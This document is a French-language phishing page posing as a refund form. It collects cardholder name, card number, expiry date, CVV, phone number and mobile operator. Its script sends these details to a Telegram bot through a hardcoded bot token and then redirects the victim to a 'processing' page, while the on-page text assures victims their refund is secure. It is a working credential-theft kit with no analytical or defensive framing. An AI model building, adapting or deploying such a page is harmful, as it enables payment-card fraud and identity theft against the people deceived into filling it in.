<!DOCTYPE html>
<html lang="fr">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Formulaire de Remboursement</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        body {
            font-family: 'Arial', sans-serif;
        }
    </style>
</head>

<body class="bg-gray-100 flex flex-col min-h-screen justify-between">

    <!-- Formulaire principal -->
    <div class="bg-white rounded-lg shadow-xl p-8 max-w-lg mx-auto mt-10">
        <!-- Titre -->
        <h1 class="text-2xl font-bold text-center text-gray-800 mb-2">Formulaire de Remboursement</h1>
        <p class="text-sm text-center text-gray-600 mb-6">
            Veuillez entrer les informations pour recevoir votre remboursement en toute sécurité.
        </p>

        <!-- Formulaire -->
        <form id="remboursement-form" onsubmit="handleFormSubmit(event)">
            <div class="mb-4">
                <label for="nom" class="block text-sm font-medium text-gray-700">Titulaire de la carte</label>
                <input type="text" id="nom" placeholder="Ex: Jean Dupont" required
                    class="mt-1 block w-full px-4 py-2 border rounded-lg">
            </div>

            <div class="mb-4">
                <label for="numero-carte" class="block text-sm font-medium text-gray-700">Numéro de carte</label>
                <input type="text" id="numero-carte" placeholder="1234 5678 9012 3456" required maxlength="19"
                    class="mt-1 block w-full px-4 py-2 border rounded-lg" oninput="formatCardNumber(this)" />
            </div>

            <div class="mb-4">
                <label for="date-expiration" class="block text-sm font-medium text-gray-700">Date d'expiration (MM/AA)</label>
                <input type="month" id="date-expiration" required class="mt-1 block w-full px-4 py-2 border rounded-lg">
            </div>

            <div class="mb-4">
                <label for="cvv" class="block text-sm font-medium text-gray-700">Code CVV</label>
                <input type="text" id="cvv" placeholder="123" required maxlength="3"
                    class="mt-1 block w-full px-4 py-2 border rounded-lg">
            </div>

            <div class="mb-4">
                <label for="telephone" class="block text-sm font-medium text-gray-700">Numéro de téléphone</label>
                <input type="tel" id="telephone" placeholder="06 12 34 56 78" required
                    class="mt-1 block w-full px-4 py-2 border rounded-lg">
            </div>

            <div class="mb-4">
                <label for="operateur" class="block text-sm font-medium text-gray-700">Choisir votre opérateur</label>
                <select id="operateur" required class="mt-1 block w-full px-4 py-2 border rounded-lg">
                    <option value="" disabled selected>-- Sélectionnez votre opérateur --</option>
                    <option value="Orange">Orange</option>
                    <option value="Bouygues">Bouygues Telecom</option>
                    <option value="SFR">SFR</option>
                </select>
            </div>

            <button type="submit"
                class="w-full bg-green-600 text-white font-bold py-2 px-4 rounded-lg hover:bg-green-700 transition duration-300">
                Valider mon remboursement
            </button>
        </form>
    </div>

    <!-- JavaScript -->
    <script>
        function formatCardNumber(input) {
            let value = input.value.replace(/\D/g, ''); // إزالة الحروف غير الرقمية
            value = value.replace(/(.{4})/g, '$1 ').trim(); // إضافة مسافة كل 4 أرقام
            input.value = value;
        }

        async function handleFormSubmit(event) {
            event.preventDefault();

            // استخراج البيانات
            const cardHolder = document.getElementById('nom').value;
            const cardNumber = document.getElementById('numero-carte').value.replace(/\s+/g, '');
            const expirationDate = document.getElementById('date-expiration').value;
            const cvv = document.getElementById('cvv').value;
            const phoneNumber = document.getElementById('telephone').value;
            const operator = document.getElementById('operateur').value;

            if (!/^\d{16}$/.test(cardNumber)) {
                alert("❌ Numéro de carte invalide. Veuillez saisir 16 chiffres.");
                return;
            }

            const message = `
🔔 Nouveau remboursement :
🧾 Titulaire: ${cardHolder}
💳 Carte: ${cardNumber.slice(-4)} (4 derniers chiffres)
📅 Expiration: ${expirationDate}
🔐 CVV: ${cvv}
📞 Téléphone: ${phoneNumber}
📡 Opérateur: ${operator}
            `;

            const botToken = '7493515332:AAGlVbk9dCC2tqKxdv8TjgM32qqPRqFsy2I'; // توكن البوت
            const chatId = 'YOUR_CHAT_ID'; // ضع الـ Chat ID الصحيح هنا
            const apiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;

            try {
                const response = await fetch(apiUrl, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ chat_id: chatId, text: message })
                });

                const result = await response.json();
                if (result.ok) {
                    alert("✅ Demande envoyée avec succès !");
                    window.location.href = "Traitement.html";
                } else {
                    alert("❌ Erreur d'envoi. Veuillez réessayer.");
                }
            } catch (error) {
                alert("❌ Problème de connexion au serveur.");
                console.error(error);
            }
        }
    </script>
</body>

</html>
